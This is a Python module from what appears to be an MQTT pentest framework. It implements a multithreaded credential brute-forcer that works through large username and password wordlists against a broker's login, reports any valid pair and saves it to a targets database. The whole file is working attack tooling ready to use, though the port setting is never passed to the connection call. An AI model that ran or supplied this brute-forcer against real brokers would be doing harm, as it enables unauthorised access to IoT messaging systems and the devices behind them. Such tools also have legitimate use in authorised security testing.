import argparse
import sys
import threading
import socket
import paho.mqtt.client as mqtt
from datetime import datetime
from pathlib import Path
from random import randint
from time import sleep
from tinydb import TinyDB
from cmd2 import with_argparser, with_category
from timebudget import timebudget

from framework.src.interfaces import InterfaceMixin

global comb_found, username_found, password_found


class CredentialsBruteforceMixin(InterfaceMixin):
    """Mixin class for the broker's credentials bruteforce"""

    def __init__(self):
        super().__init__()
        self.db = TinyDB('./framework/database/targets.json')
        self.args = None

    bruteforcer_parser = argparse.ArgumentParser(
        description="Bruteforce credentials of a target based on a dictionary.")
    bruteforcer_parser.add_argument('-dp', '--dict_password',
                                    help='specifies a dictionary to use for passwords instead of the default one')
    bruteforcer_parser.add_argument('-du', '--dict_username',
                                    help='specifies a dictionary to use for usernames instead of the default one')
    bruteforcer_parser.add_argument('-nt', '--nThreads', help='specified number of thread to use')
    bruteforcer_parser.add_argument('-p', '--port', help='port to target, default is 1883')
    bruteforcer_parser.add_argument('-u', '--username', help='username, if not supplied the script will try to guess it'
                                                             ' with a dictionary')
    bruteforcer_parser.add_argument('-t', '--target', help='specified number of thread to use')
    bruteforcer_parser.add_argument('--verbose', help='increase output verbosity',
                                    action="store_true")

    @with_category(InterfaceMixin.CMD_CAT_BROKER_OP)
    @with_argparser(bruteforcer_parser)
    def do_bruteforce(self, args):

        global comb_found
        comb_found = False
        db_flag = False
        self.args = args

        self.print_info("Credentials Bruteforcer started - Good Luck!\n")

        if args.target is None:
            # Getting last row from database
            args.target = self.db.get(doc_id=len(self.db)).get('ip')
            db_flag = True
            self.print_info('Target not supplied, retrieving last target inserted in database')

        if args.nThreads is None:
            args.nThreads = 1
            self.print_info('Number of threads not supplied, setting threads to 1')

        if args.port is None:
            args.port = 1883
            self.print_info('Port argv not supplied, setting port to 1883')

        if args.dict_password is None:
            args.dict_password = "framework/assets/dicts/xato-net-10-million-passwords.txt" # right_psw.txt
            self.print_info('Default dictionaries for password will be used')

        if args.dict_username is None and args.username is None:
            args.dict_username = "framework/assets/dicts/xato-net-10-million-usernames.txt"
            self.print_info('No username specified, trying with a dictionary if you have the whole week...')
            self.print_info('Default dictionaries for username will be used')

        if args.dict_username is not None and args.username is not None:
            self.print_error(
                'Both username string and dictionary of usernames is set, performing combinations with username')

        start_time = datetime.now().strftime("%A,%d %b - %H:%M:%S")

        with timebudget("     > Your search for credentials"):
            if args.username is not None:
                self.print_ok('DETAILS' +
                                '\nTARGET => ' + args.target +
                                '\nPORT => ' + str(args.port) +
                                '\nTHREADS => ' + str(args.nThreads) +
                                '\nUSERNAME => ' + args.username +
                                '\nDICTIONARY => ' + args.dict_password +
                                '\nSTARTING TIME ==> ' + str(start_time))

                with open(Path(args.dict_password)) as f:
                    len_psw_dict = sum(1 for _ in f)

                self.print_ok('Parsed %d passwords from %s' % (len_psw_dict, args.dict_password))

                self.execute_on_passwords(args.username, args.dict_password, args.target, args.port, args.nThreads,
                                          len_psw_dict, 1)

            if args.username is None:
                self.print_ok('DETAILS' +
                                '\nTARGET => ' + args.target +
                                '\nPORT => ' + str(args.port) +
                                '\nTHREADS => ' + str(args.nThreads) +
                                '\nDICTIONARIES => ' + args.dict_password + ' && ' + args.dict_username +
                                '\nSTARTING TIME ==> ' + str(start_time))

                with open(Path(args.dict_username)) as f:
                    len_usr_dict = sum(1 for _ in f)

                self.print_ok('Parsed %d usernames from %s' % (len_usr_dict, args.dict_username))

                with open(Path(args.dict_password)) as f:
                    len_psw_dict = sum(1 for _ in f)

                self.print_ok('Parsed %d passwords from %s' % (len_psw_dict, args.dict_password))
                usrnmList_total = 0

                self.print_info('Begin execution bruteforcing credentials')
                try:
                    with open(Path(args.dict_username)) as usrnm_file:
                        for username in usrnm_file:
                            if comb_found:
                                break

                            try:
                                self.execute_on_passwords(username, args.dict_password, args.target, args.port,
                                                          args.nThreads,
                                                          len_psw_dict, usrnmList_total)

                            except:
                                break
                            usrnmList_total += 1
                            sys.stdout.write(' >> %d/%d USERNAMES\r' % (usrnmList_total, len_usr_dict))
                            sys.stdout.flush()
                except KeyboardInterrupt:
                    pass

        if comb_found:
            if db_flag:
                self.print_question(
                    f"Type \\s to add the credentials to the database for the selected target, anythinge else to quit")
                ans = input(f"Input: ")
                if ans == '\\s':
                    self.db.update({'credentials': {'username': username_found, 'password': password_found}},
                                   doc_ids=[(len(self.db))])
                    self.print_ok(f"Target credentials updated")
        else:
            self.print_error("Bad luck! No username - password combination has been found.")

        self.print_info('Quitted from Bruteforcer\n')

    def execute_on_passwords(self, username, wordlist, target, port, nThreads, lenWordlist, usrs_scanned):
        thread_counter = 0
        i = 1
        wList_counter = 1
        wList_total = 0
        wList = []

        bEOF = False

        with open(Path(wordlist)) as infile:
            for line in infile:

                try:
                    if comb_found:
                        break
                    wList.append(line.strip('\n'))
                    if wList_counter == 10:
                        wList_total += wList_counter
                        t = PswCracker(target, port, username, wList)
                        # t.setDaemon(True)
                        t.start()
                        del wList
                        wList = []
                        thread_counter += 1
                        wList_counter = 0

                    if thread_counter == nThreads and bEOF is False:
                        t.join()
                        thread_counter = 0

                    if i == lenWordlist:
                        bEOF = True
                        wList_total += wList_counter
                        t = PswCracker(target, port, username, wList)
                        t.setDaemon(True)
                        t.start()
                        t.join()

                    sys.stdout.write(' >>> %d/%d attempt\r' % (wList_total, lenWordlist))
                    sys.stdout.flush()
                    i += 1
                    wList_counter += 1

                except Exception as e:
                    self.print_error("An error occurred: " + str(e))
                    break

        t.join()

        if not comb_found:
            self.print_verbose("No combination with username [ %s ] has been found." % username.rstrip(), self.args)
        else:
            self.print_ok('After %d attempts a successful combination has been found!' % (wList_total + usrs_scanned))
            self.print_ok(' > USERNAME: %s - PASSWORD: %s\r' % (username_found, password_found))


class PswCracker(threading.Thread):
    def __init__(self, target, port, username, psw_list):
        threading.Thread.__init__(self)
        self.target = target
        self.port = port
        self.target_username = username
        self.psw_list = psw_list
        self.cracker = mqtt.Client('C%d' % (randint(1, 1000)))
        self.p_id = False
        self._socket_exc = None

    def join(self):
        super().join()
        if self._socket_exc:
            raise self._socket_exc

    def on_connect(self, c, u, f, rc):
        # rc = 0 means login successful
        if rc == 0:
            self.p_id = True

    def run(self):
        global comb_found, username_found, password_found

        try:
            for passwd in self.psw_list:
                if comb_found:
                    return
                self.cracker.username_pw_set(username=self.target_username, password=passwd)
                self.cracker.on_connect = self.on_connect
                self.cracker.connect(self.target)
                self.cracker.loop_start()
                sleep(1)
                try:
                    self.cracker.disconnect()
                    self.cracker.loop_stop()
                except:
                    pass
                if self.p_id:
                    username_found = self.target_username
                    password_found = passwd
                    comb_found = True
                    break
        except socket.error as e:
            # Connection failed, host down
            self._socket_exc = e
        finally:
            del self.cracker
